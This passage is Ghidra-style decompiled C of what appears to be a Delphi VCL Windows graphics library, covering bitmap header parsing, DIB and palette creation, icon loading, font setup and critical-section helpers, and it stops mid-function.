void FUN_0041f73c(undefined4 param_1,int *param_2,int param_3,undefined2 *param_4)

{
  WORD WVar1;
  BITMAPINFO *pBVar2;
  DWORD DVar3;
  int iVar4;
  HDC pHVar5;
  HBITMAP h;
  HGDIOBJ ho;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined2 extraout_var;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uStack212;
  undefined *puStack208;
  undefined *puStack204;
  undefined4 uStack200;
  undefined *puStack196;
  undefined *puStack192;
  undefined local_ae [102];
  ushort local_48;
  ushort local_46;
  WORD local_44;
  WORD local_42;
  BITMAPINFO *local_40;
  int *local_3c;
  HPALETTE local_38;
  HPALETTE local_34;
  HGDIOBJ local_30;
  HBITMAP local_2c;
  byte local_25;
  DWORD local_24;
  undefined4 *local_20;
  BITMAPINFO *local_1c;
  void *local_18;
  HDC local_14;
  HDC local_10;
  int *local_c;
  undefined4 local_8;
  
  puStack204 = &stack0xfffffffc;
  local_34 = (HPALETTE)0x0;
  local_2c = (HBITMAP)0x0;
  local_3c = (int *)0x0;
  puStack192 = (undefined *)0x41f76f;
  local_c = param_2;
  local_8 = param_1;
  (**(code **)(*param_2 + 0xc))(param_2,&local_24,4);
  local_25 = local_24 == 0xc;
  if ((bool)local_25) {
    local_24 = 0x28;
  }
  puStack192 = (undefined *)0x41f794;
  local_40 = (BITMAPINFO *)FUN_004026a8(local_24 + 0x40c);
  puStack196 = &LAB_0041fc59;
  uStack200 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack200;
  puStack208 = &LAB_0041fc2c;
  uStack212 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack212;
  local_1c = local_40;
  if (local_25 == 0) {
    puStack192 = &stack0xfffffffc;
    (**(code **)(*local_c + 0xc))(local_c,&(local_40->bmiHeader).biWidth,local_24 - 4);
    uVar7 = param_3 - local_24;
    DVar3 = (local_40->bmiHeader).biCompression;
    if ((DVar3 != 3) && (DVar3 != 0)) {
      local_3c = (int *)FUN_00403af4((int *)&PTR_LAB_00411360,'\x01',extraout_ECX);
      if (param_4 == (undefined2 *)0x0) {
        FUN_004030a0((undefined4 *)local_ae,0xe,0);
        local_ae._0_2_ = 0x4d42;
        local_ae._2_4_ = local_24 + uVar7;
        param_4 = (undefined2 *)local_ae;
      }
      (**(code **)(*local_3c + 0x10))(local_3c,param_4,0xe);
      (**(code **)(*local_3c + 0x10))(local_3c,&local_24,4);
      (**(code **)(*local_3c + 0x10))(local_3c,&(local_1c->bmiHeader).biWidth,local_24 - 4);
      FUN_00413674(local_3c,local_c,extraout_ECX_00,uVar7,0);
      (**(code **)(*local_3c + 0x14))(local_3c,-uVar7,CONCAT22(extraout_var,2));
      local_c = local_3c;
    }
  }
  else {
    puStack204 = &stack0xfffffffc;
    puStack192 = &stack0xfffffffc;
    (**(code **)(*local_c + 0xc))(local_c,&local_48,8);
    pBVar2 = local_40;
    FUN_004030a0((undefined4 *)local_40,0x28,0);
    (pBVar2->bmiHeader).biWidth = (uint)local_48;
    (pBVar2->bmiHeader).biHeight = (uint)local_46;
    (pBVar2->bmiHeader).biPlanes = local_44;
    (pBVar2->bmiHeader).biBitCount = local_42;
    uVar7 = param_3 - 0xc;
  }
  pBVar2 = local_40;
  (local_40->bmiHeader).biSize = local_24;
  local_20 = (undefined4 *)
             ((int)&(((BITMAPINFO *)(local_1c->bmiColors + -10))->bmiHeader).biSize + local_24);
  if ((local_40->bmiHeader).biPlanes != 1) {
    FUN_0041b1fc();
  }
  if ((local_24 == 0x28) &&
     (((WVar1 = (pBVar2->bmiHeader).biBitCount, WVar1 == 0x10 || (WVar1 == 0x20)) &&
      ((pBVar2->bmiHeader).biCompression == 3)))) {
    FUN_00413604(local_c,local_20,0xc);
    local_20 = local_20 + 3;
    uVar7 = uVar7 - 0xc;
  }
  if ((pBVar2->bmiHeader).biClrUsed == 0) {
    DVar3 = FUN_0041b48c((pBVar2->bmiHeader).biBitCount);
    (pBVar2->bmiHeader).biClrUsed = DVar3;
  }
  uVar8 = (uint)local_25;
  FUN_00413604(local_c,local_20,(pBVar2->bmiHeader).biClrUsed * (uint)(byte)(&DAT_004409f0)[uVar8]);
  uVar7 = uVar7 - (pBVar2->bmiHeader).biClrUsed * (uint)(byte)(&DAT_004409f0)[uVar8];
  if ((pBVar2->bmiHeader).biSizeImage == 0) {
    iVar4 = FUN_0041b4ac((pBVar2->bmiHeader).biWidth,(uint)(pBVar2->bmiHeader).biBitCount,0x20);
    uVar8 = (pBVar2->bmiHeader).biHeight;
    uVar6 = (int)uVar8 >> 0x1f;
    (pBVar2->bmiHeader).biSizeImage = iVar4 * ((uVar8 ^ uVar6) - uVar6);
  }
  uVar8 = (pBVar2->bmiHeader).biSizeImage;
  if (uVar8 < uVar7) {
    uVar7 = uVar8;
  }
  if (local_25 != 0) {
    FUN_0041b754((int)local_20);
  }
  pHVar5 = GetDC((HWND)0x0);
  local_10 = (HDC)FUN_0041b31c((int)pHVar5);
  uVar9 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffff20;
  DVar3 = (local_40->bmiHeader).biCompression;
  if (((DVar3 == 0) || (DVar3 == 3)) && (DAT_00440760 == '\0')) {
    local_2c = CreateDIBSection(local_10,local_1c,0,&local_18,(HANDLE)0x0,0);
    if ((local_2c == (HBITMAP)0x0) || (local_18 == (void *)0x0)) {
      DVar3 = GetLastError();
      if (DVar3 == 0) {
        FUN_0041b1fc();
      }
      else {
        FUN_0040cc2c();
      }
    }
    uVar10 = *in_FS_OFFSET;
    *in_FS_OFFSET = &stack0xffffff14;
    FUN_00413604(local_c,local_18,uVar7);
    *in_FS_OFFSET = uVar10;
    *in_FS_OFFSET = uVar9;
    ReleaseDC((HWND)0x0,local_10);
    return;
  }
  local_14 = (HDC)0x0;
  local_18 = (void *)FUN_004026a8(uVar7);
  *in_FS_OFFSET = &stack0xffffff14;
  FUN_00413604(local_c,local_18,uVar7);
  pHVar5 = CreateCompatibleDC(local_10);
  local_14 = (HDC)FUN_0041b31c((int)pHVar5);
  h = CreateCompatibleBitmap(local_10,1,1);
  local_30 = SelectObject(local_14,h);
  local_38 = (HPALETTE)0x0;
  DVar3 = (local_40->bmiHeader).biClrUsed;
  if (DVar3 != 0) {
    local_34 = FUN_0041ba0c((HGDIOBJ)0x0,local_20,DVar3);
    local_38 = SelectPalette(local_14,local_34,0);
    RealizePalette(local_14);
  }
  uVar9 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffff08;
  local_2c = CreateDIBitmap(local_14,&local_1c->bmiHeader,4,local_18,local_1c,0);
  if (local_2c == (HBITMAP)0x0) {
    DVar3 = GetLastError();
    if (DVar3 == 0) {
      FUN_0041b1fc();
    }
    else {
      FUN_0040cc2c();
    }
  }
  *in_FS_OFFSET = uVar9;
  if (local_38 != (HPALETTE)0x0) {
    SelectPalette(local_14,local_38,-1);
  }
  ho = SelectObject(local_14,local_30);
  DeleteObject(ho);
  return;
}



void FUN_0041fca4(int param_1,int *param_2,int param_3)

{
  short local_70 [7];
  undefined4 local_62 [21];
  
  FUN_0041f3a4(param_1);
  if (param_3 == 0) {
    FUN_004030a0(local_62,0x54,0);
    FUN_0041f614(param_1,0,0,(int *)0x0,0,local_62);
  }
  else {
    FUN_00413604(param_2,local_70,0xe);
    if (local_70[0] != 0x4d42) {
      FUN_0041b1fc();
    }
    FUN_0041f73c(param_1,param_2,param_3 + -0xe,local_70);
  }
  return;
}



void FUN_0041fd14(int *param_1,HANDLE param_2)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  undefined4 local_5c [21];
  HPALETTE local_8;
  
  iVar1 = param_1[10];
  if (param_2 != *(HANDLE *)(iVar1 + 8)) {
    FUN_0041f3a4((int)param_1);
    FUN_004030a0(local_5c,0x54,0);
    if (param_2 != (HANDLE)0x0) {
      GetObjectA(param_2,0x54,local_5c);
    }
    if (*(int *)(iVar1 + 4) == 1) {
      local_8 = *(HPALETTE *)(iVar1 + 0x10);
      *(undefined4 *)(iVar1 + 0x10) = 0;
    }
    else if (*(HPALETTE *)(iVar1 + 0x10) == DAT_00442890) {
      local_8 = DAT_00442890;
    }
    else {
      local_8 = FUN_0041e944(*(HPALETTE *)(iVar1 + 0x10));
    }
    *in_FS_OFFSET = &stack0xffffff8c;
    uVar2 = 0;
    FUN_0041f614((int)param_1,param_2,local_8,(int *)0x0,0,local_5c);
    *in_FS_OFFSET = uVar2;
    (**(code **)(*param_1 + 0x10))(param_1,param_1);
  }
  return;
}



void FUN_0041ff10(int *param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  byte bVar5;
  undefined4 local_60 [2];
  int local_58;
  int local_40;
  
  bVar5 = 0;
  iVar1 = param_1[10];
  if (param_2 != *(int *)(iVar1 + 0x20)) {
    FUN_0041f3b4(param_1,param_2,param_3);
    puVar3 = (undefined4 *)(iVar1 + 0x18);
    puVar4 = local_60;
    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar4 = *puVar3;
      puVar3 = puVar3 + (uint)bVar5 * -2 + 1;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
    local_58 = param_2;
    local_40 = param_2;
    FUN_0041ed48((int)param_1,*(HBITMAP *)(iVar1 + 8),*(HPALETTE *)(iVar1 + 0x10),local_60);
    (**(code **)(*param_1 + 0x10))(param_1,param_1);
  }
  return;
}



void FUN_00420038(int *param_1,byte param_2)

{
  int iVar1;
  undefined4 uVar2;
  HDC pHVar3;
  HBITMAP pHVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 *in_FS_OFFSET;
  byte bVar8;
  undefined4 uStack124;
  undefined4 local_61;
  undefined4 local_5d;
  undefined4 local_59;
  undefined4 local_4d;
  undefined4 local_49;
  undefined4 local_45;
  undefined4 local_41;
  undefined2 local_3d;
  ushort local_3b;
  undefined4 local_39;
  undefined4 local_21;
  undefined4 local_1d;
  undefined4 local_19;
  char local_d;
  HPALETTE local_c;
  int *local_8;
  
  bVar8 = 0;
  local_8 = param_1;
  uVar2 = FUN_0041f1f4((int)param_1);
  if (param_2 != (byte)uVar2) {
    if (param_2 == 0) {
      (**(code **)(*local_8 + 0x6c))(local_8,1);
    }
    else {
      if (param_2 != 8) {
        FUN_004030a0(&local_61,0x54,0);
        iVar1 = local_8[10];
        puVar6 = (undefined4 *)(iVar1 + 0x18);
        puVar7 = &local_61;
        for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar7 = *puVar6;
          puVar6 = puVar6 + (uint)bVar8 * -2 + 1;
          puVar7 = puVar7 + (uint)bVar8 * -2 + 1;
        }
        local_d = '\0';
        local_4d = 0;
        local_49 = 0x28;
        local_45 = local_5d;
        local_41 = local_59;
        local_3d = 1;
        local_3b = (ushort)(byte)(&DAT_004409f3)[param_2];
        local_c = *(HPALETTE *)(iVar1 + 0x10);
        if (param_2 == 2) {
          local_c = DAT_00442890;
        }
        else if (param_2 == 3) {
          pHVar3 = GetDC((HWND)0x0);
          pHVar3 = (HDC)FUN_0041b31c((int)pHVar3);
          local_c = CreateHalftonePalette(pHVar3);
          local_d = '\x01';
          uStack124 = 0x420116;
          ReleaseDC((HWND)0x0,pHVar3);
        }
        else if (param_2 == 5) {
          local_39 = 3;
          local_21 = 0xf800;
          local_1d = 0x7e0;
          local_19 = 0x1f;
        }
        uStack124 = *in_FS_OFFSET;
        *in_FS_OFFSET = &uStack124;
        puVar6 = &local_61;
        pHVar4 = (HBITMAP)(**(code **)(*local_8 + 100))();
        FUN_0041ed48((int)local_8,pHVar4,local_c,puVar6);
        *(bool *)((int)local_8 + 0x22) = local_c != (HPALETTE)0x0;
        *in_FS_OFFSET = uStack124;
        if (local_d != '\0') {
          uStack124 = 0x420184;
          DeleteObject(local_c);
        }
        return;
      }
      FUN_0041b1e4((int **)PTR_PTR_DAT_00441414);
    }
  }
  return;
}



void FUN_004201fc(int *param_1,int *param_2,char param_3)

{
  undefined4 *puVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  int *piVar5;
  HGDIOBJ pvVar6;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  int local_43c;
  uint local_438;
  int local_434;
  HGDIOBJ local_430;
  undefined local_42c [10];
  int local_422;
  undefined4 local_41e;
  undefined2 local_41a;
  undefined2 local_418;
  undefined2 local_416;
  undefined2 local_414;
  tagPALETTEENTRY local_412 [256];
  
  FUN_004030a0((undefined4 *)local_42c,0xe,0);
  local_42c._0_2_ = 0x4d42;
  if (*(undefined4 **)(param_1[10] + 0x6c) == (undefined4 *)0x0) {
    FUN_0041f330((int)param_1);
    iVar2 = param_1[10];
    local_43c = 0;
    if (*(HANDLE *)(iVar2 + 0x14) != (HANDLE)0x0) {
      FUN_0041c160(*(HANDLE *)(iVar2 + 0x14),&local_434,&local_43c,*(uint *)(iVar2 + 0x50));
      if (*(char *)(iVar2 + 0x70) != '\0') {
        local_434 = 0xc;
        if (*(ushort *)(iVar2 + 0x3e) < 9) {
          local_434 = (1 << ((byte)*(ushort *)(iVar2 + 0x3e) & 0x1f)) * 3 + 0xc;
        }
      }
      local_43c = local_43c + local_434 + 0xe;
      FUN_004030a0((undefined4 *)local_42c,0xe,0);
      local_42c._0_2_ = 0x4d42;
      piVar5 = (int *)FUN_0041f108(param_1,extraout_EDX,extraout_ECX);
      FUN_0041aff8(piVar5,1);
      pvVar6 = SelectObject(*(HDC *)(param_1[0xb] + 4),*(HGDIOBJ *)(iVar2 + 0x14));
      local_430 = (HGDIOBJ)FUN_0041b31c((int)pvVar6);
      local_438 = GetDIBColorTable(*(HDC *)(param_1[0xb] + 4),0,0x100,(RGBQUAD *)local_412);
      SelectObject(*(HDC *)(param_1[0xb] + 4),local_430);
      uVar3 = *(uint *)(iVar2 + 0x50);
      if ((uVar3 != 0) && (uVar3 < local_438)) {
        local_438 = uVar3;
      }
      if ((((*(char *)(iVar2 + 0x70) == '\0') && (local_438 == 0)) && (*(int *)(iVar2 + 0x10) != 0))
         && (*(char *)(iVar2 + 0x71) == '\0')) {
        local_438 = FUN_0041bab0(*(HPALETTE *)(iVar2 + 0x10),local_412,0xff);
        if (8 < *(ushort *)(iVar2 + 0x3e)) {
          local_43c = local_43c + local_438 * 4;
          local_434 = local_434 + local_438 * 4;
        }
      }
      local_42c._2_4_ = local_43c;
      local_422 = local_434 + 0xe;
    }
    if (param_3 != '\0') {
      FUN_0041363c(param_2,&local_43c,4);
    }
    if (local_43c != 0) {
      FUN_0041e294(iVar2 + 0x18);
      if (local_438 != 0) {
        if ((*(uint *)(iVar2 + 0x50) == 0) || (*(uint *)(iVar2 + 0x50) != local_438)) {
          *(uint *)(iVar2 + 0x50) = local_438;
        }
        if (*(char *)(iVar2 + 0x70) != '\0') {
          FUN_0041b78c((int)local_412,(int *)&local_438);
        }
      }
      if (*(char *)(iVar2 + 0x70) == '\0') {
        FUN_0041363c(param_2,local_42c,0xe);
        FUN_0041363c(param_2,iVar2 + 0x30,0x28);
        if ((8 < *(ushort *)(iVar2 + 0x3e)) && ((*(byte *)(iVar2 + 0x40) & 3) != 0)) {
          FUN_0041363c(param_2,iVar2 + 0x58,0xc);
        }
      }
      else {
        local_41e = 0xc;
        local_41a = *(undefined2 *)(iVar2 + 0x34);
        local_418 = *(undefined2 *)(iVar2 + 0x38);
        local_416 = 1;
        local_414 = *(undefined2 *)(iVar2 + 0x3e);
        FUN_0041363c(param_2,local_42c,0xe);
        FUN_0041363c(param_2,&local_41e,0xc);
      }
      FUN_0041363c(param_2,local_412,(byte)(&DAT_004409fc)[*(byte *)(iVar2 + 0x70)] * local_438);
      FUN_0041363c(param_2,*(undefined4 *)(iVar2 + 0x2c),*(int *)(iVar2 + 0x44));
    }
  }
  else {
    local_43c = (**(code **)**(undefined4 **)(param_1[10] + 0x6c))();
    if (param_3 != '\0') {
      FUN_0041363c(param_2,&local_43c,4);
    }
    puVar1 = *(undefined4 **)(param_1[10] + 0x6c);
    uVar4 = (**(code **)*puVar1)();
    (**(code **)(*param_2 + 0x10))(param_2,puVar1[1],uVar4);
  }
  return;
}



void FUN_004204bc(int *param_1,undefined2 *param_2,HPALETTE *param_3,HPALETTE *param_4)

{
  int iVar1;
  HPALETTE pHVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  undefined4 *in_FS_OFFSET;
  byte bVar6;
  undefined4 uStackY124;
  undefined *puStackY120;
  undefined *puStackY116;
  undefined4 local_5c [5];
  undefined4 local_48;
  undefined4 local_44;
  HPALETTE *local_8;
  
  bVar6 = 0;
  *param_2 = 2;
  local_8 = param_3;
  FUN_0041f3b4(param_1,param_2,param_3);
  iVar1 = param_1[10];
  puVar4 = (undefined4 *)(iVar1 + 0x18);
  puVar5 = local_5c;
  for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar5 = *puVar4;
    puVar4 = puVar4 + (uint)bVar6 * -2 + 1;
    puVar5 = puVar5 + (uint)bVar6 * -2 + 1;
  }
  local_44 = 0;
  local_48 = 0;
  puStackY116 = (undefined *)0x420509;
  pHVar2 = FUN_0041e2e0(*(HBITMAP *)(iVar1 + 8),*(HPALETTE *)(iVar1 + 0x10),
                        *(HPALETTE *)(iVar1 + 0x10),param_1[0xb],(int)local_5c);
  *local_8 = pHVar2;
  puStackY120 = &LAB_00420536;
  uStackY124 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY124;
  puStackY116 = &stack0xfffffffc;
  pHVar2 = FUN_0041e944(*(HPALETTE *)(param_1[10] + 0x10));
  *param_4 = pHVar2;
  *in_FS_OFFSET = uStackY124;
  return;
}



int * FUN_004205a4(int *param_1,char param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_0041c480(param_1,'\0',param_3);
  *(undefined *)((int)param_1 + 0x21) = 1;
  iVar1 = FUN_00403af4((int *)&PTR_LAB_004196d8,'\x01',extraout_ECX_00);
  param_1[10] = iVar1;
  FUN_0041e10c(iVar1);
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



undefined4 FUN_004206e0(int param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_0042071c(param_1,param_2,param_3);
  return *(undefined4 *)(*(int *)(param_1 + 0x28) + 8);
}



void FUN_0042071c(int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 uVar2;
  undefined auStack20 [2];
  short local_12;
  ushort local_10;
  undefined local_c [4];
  
  iVar1 = *(int *)(param_1 + 0x28);
  if ((*(int *)(iVar1 + 8) == 0) && (*(int **)(iVar1 + 0xc) != (int *)0x0)) {
    FUN_004133f8(*(int **)(iVar1 + 0xc),param_2,param_3,0,0);
    uVar2 = 0x42074b;
    FUN_00413604(*(int **)(iVar1 + 0xc),auStack20,6);
    if (local_12 != 0) {
      if (local_12 == 1) {
        uVar2 = 6;
        FUN_0041bd5c(*(int **)(iVar1 + 0xc),local_c,(uint)local_10,(uint *)(iVar1 + 0x10),
                     (uint *)(param_1 + 0x2c));
      }
      else {
        uVar2 = 0x420787;
        FUN_0041b208();
      }
    }
    *(undefined4 *)(iVar1 + 8) = uVar2;
  }
  return;
}



void FUN_00420794(int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  HICON pHVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack40;
  undefined *puStack36;
  undefined *puStack32;
  undefined4 local_e;
  int *local_8;
  
  iVar1 = *(int *)(param_1 + 0x28);
  if (*(int *)(iVar1 + 0xc) == 0) {
    if (*(int *)(iVar1 + 8) == 0) {
      puStack32 = (undefined *)0x4207b7;
      FUN_0041b208();
      param_3 = extraout_ECX;
    }
    puStack32 = (undefined *)0x4207c3;
    local_8 = (int *)FUN_00403af4((int *)&PTR_LAB_00411360,'\x01',param_3);
    puStack36 = &LAB_00420821;
    uStack40 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack40;
    puStack32 = &stack0xfffffffc;
    iVar2 = FUN_004206e0(param_1,extraout_EDX,extraout_ECX_00);
    if (iVar2 == DAT_004428a8) {
      FUN_004030a0(&local_e,6,0);
      FUN_0041363c(local_8,&local_e,6);
    }
    else {
      pHVar3 = (HICON)FUN_004206e0(param_1,extraout_EDX_00,extraout_ECX_01);
      FUN_0041c284(local_8,pHVar3,'\0');
    }
    *in_FS_OFFSET = uStack40;
    *(int **)(iVar1 + 0xc) = local_8;
  }
  return;
}



void FUN_00420900(int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  undefined *puStack28;
  undefined4 uStack24;
  
  uStack24 = 0x420919;
  iVar1 = FUN_00403af4((int *)&PTR_LAB_004196d8,'\x01',param_3);
  puStack28 = &DAT_00420940;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  *(undefined4 *)(iVar1 + 8) = param_2;
  *(undefined4 *)(iVar1 + 0xc) = param_3;
  *in_FS_OFFSET = uStack32;
  uStack24 = 0x42095f;
  FUN_0041e10c(iVar1);
  uStack24 = 0x420967;
  FUN_0041e110(*(int **)(param_1 + 0x28));
  *(int *)(param_1 + 0x28) = iVar1;
  return;
}



void FUN_004209d0(void)

{
  FUN_0041b1cc((int **)PTR_LAB_00441384);
  return;
}



void FUN_004209f8(void)

{
  HDC hdc;
  
  hdc = GetDC((HWND)0x0);
  DAT_00442898 = GetDeviceCaps(hdc,0x5a);
  ReleaseDC((HWND)0x0,hdc);
  DAT_00442890 = FUN_0041b85c((undefined4 *)&DAT_00440a00);
  return;
}



BYTE FUN_00420a30(void)

{
  HDC hdc;
  HGDIOBJ pvVar1;
  BOOL BVar2;
  BYTE BVar3;
  tagTEXTMETRICA tStack64;
  
  BVar3 = '\x01';
  hdc = GetDC((HWND)0x0);
  if (hdc != (HDC)0x0) {
    pvVar1 = SelectObject(hdc,DAT_004428a4);
    if (pvVar1 != (HGDIOBJ)0x0) {
      BVar2 = GetTextMetricsA(hdc,&tStack64);
      if (BVar2 != 0) {
        BVar3 = tStack64.tmCharSet;
      }
    }
    ReleaseDC((HWND)0x0,hdc);
  }
  return BVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00420a74(void)

{
  BYTE BVar1;
  byte bVar2;
  
  bVar2 = 0;
  _DAT_00440738 = MulDiv(8,DAT_00442898,0x48);
  _DAT_00440738 = -_DAT_00440738;
  if (PTR_DAT_004415b8[0xc] != '\0') {
    BVar1 = FUN_00420a30();
    if (BVar1 == 0x80) {
      s__MS_Sans_Serif_0044073f._0_4_ = 0x826c820f;
      *(undefined4 *)(s__MS_Sans_Serif_0044073f + (uint)bVar2 * -8 + 4) =
           (&DAT_00420ad8)[(uint)bVar2 * -2];
      *(undefined4 *)(s__MS_Sans_Serif_0044073f + (uint)bVar2 * -8 + (uint)bVar2 * -8 + 8) =
           (&DAT_00420adc)[(uint)bVar2 * -2 + (uint)bVar2 * -2];
      *(undefined4 *)
       ((int)(s__MS_Sans_Serif_0044073f + (uint)bVar2 * -8 + (uint)bVar2 * -8 + 8) +
       ((uint)bVar2 * -2 + 1) * 4) =
           (&DAT_00420adc + (uint)bVar2 * -2 + (uint)bVar2 * -2)[(uint)bVar2 * -2 + 1];
      _DAT_00440738 = MulDiv(9,DAT_00442898,0x48);
      _DAT_00440738 = -_DAT_00440738;
      DAT_0044073e = BVar1;
    }
  }
  return;
}



int * FUN_00420b40(int *param_1,char param_2,undefined4 param_3)

{
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_2 = extraout_DL;
  }
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 2));
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



void FUN_00420ba4(int param_1)

{
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return;
}



void FUN_00420bb0(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return;
}



void FUN_00420bbc(int param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined4 uStack24;
  undefined *puStack20;
  undefined4 *local_10;
  undefined4 *local_c;
  int local_8;
  
  local_10 = *(undefined4 **)(param_1 + 4);
  if (local_10 == (undefined4 *)0x0) {
    return;
  }
  puStack20 = (undefined *)0x420bd8;
  local_c = local_10;
  local_8 = param_1;
  FUN_00420ba4(param_1);
  uStack28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack28;
  *(undefined4 *)(local_8 + 4) = *local_10;
  *in_FS_OFFSET = uStack28;
  puStack20 = &DAT_00420c0e;
  uStack24 = 0x420c06;
  FUN_00420bb0(local_8);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00420c34(void)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack16;
  undefined *puStack12;
  undefined *puStack8;
  
  puStack8 = &stack0xfffffffc;
  puStack12 = &LAB_00420cfd;
  uStack16 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack16;
  _DAT_00442894 = _DAT_00442894 + 1;
  if (_DAT_00442894 == 0) {
    FUN_00403b24(DAT_004428ec);
    FUN_00403b24(DAT_004409e8);
    FUN_00403b24(DAT_004409e4);
    FUN_0041ddf0();
    FUN_00403b24(DAT_004409ec);
    FUN_00403b24(DAT_004428e8);
    FUN_00403b24(DAT_004428dc);
    FUN_00403b24(DAT_004428e0);
    FUN_00403b24(DAT_004428e4);
    DeleteObject(DAT_00442890);
    DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_004428ac);
    DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_004428c4);
    FUN_0040521c((int **)&DAT_00440904,"\x0e\x0eTIdentMapEntry\b",0x12);
    FUN_0040521c((int **)&DAT_00440764,"\x0e\x0eTIdentMapEntry\b",0x34);
  }
  *in_FS_OFFSET = uStack16;
  return;
}



void FUN_00420f90(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  FUN_004026a8(param_4);
  return;
}



void FUN_00420fa0(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  FUN_004026c8(param_4);
  return;
}



void FUN_00420fb0(undefined param_1,undefined param_2,undefined param_3,undefined4 *param_4,
                 undefined param_5,uint param_6)

{
  FUN_004030a0(param_4,param_6,param_5);
  return;
}



void FUN_00420fc8(undefined param_1,undefined param_2,undefined param_3,undefined4 *param_4,
                 undefined4 *param_5,uint param_6)

{
  FUN_0040285c(param_5,param_4,param_6);
  return;
}



void FUN_00420fdc(undefined param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 int param_5,int param_6,int *param_7)

{
  (**(code **)(*param_7 + 0xc))(param_7,param_4,param_5 * param_6);
  return;
}



void FUN_00420ff8(undefined param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 int param_5,int param_6,int *param_7)

{
  (**(code **)(*param_7 + 0x10))(param_7,param_4,param_5 * param_6);
  return;
}



undefined4 FUN_00421014(void)

{
  return 0;
}



void FUN_0042101c(void)

{
  FUN_00402a10();
  return;
}



void FUN_00421088(undefined4 *param_1)

{
  int *piVar1;
  
  piVar1 = FUN_0040b8bc((int *)&DAT_00418978,'\x01',param_1);
  FUN_00404208((int)piVar1);
  return;
}



void FUN_004210a0(int *param_1)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  undefined4 *puVar3;
  undefined *puStack32;
  undefined *puStack28;
  undefined *puStack24;
  byte *local_10;
  undefined4 local_c;
  undefined local_8;
  
  puStack24 = &stack0xfffffffc;
  local_10 = (byte *)0x0;
  puStack28 = &LAB_00421105;
  puStack32 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack32;
  local_c = *(undefined4 *)(*param_1 + 0x14);
  local_8 = 0;
  puVar3 = &local_c;
  uVar2 = 0;
  FUN_0040658c((int **)PTR_LAB_004414d0,(int *)&local_10);
  iVar1 = FUN_0040b8f8((int)&LAB_00421080,'\x01',local_10,uVar2,puVar3);
  FUN_00404208(iVar1);
  *in_FS_OFFSET = uVar2;
  puStack32 = &LAB_0042110c;
  FUN_004047a8((int *)&local_10);
  return;
}



int * FUN_00421164(int *param_1,char param_2,undefined4 param_3)

{
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  char extraout_DL;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
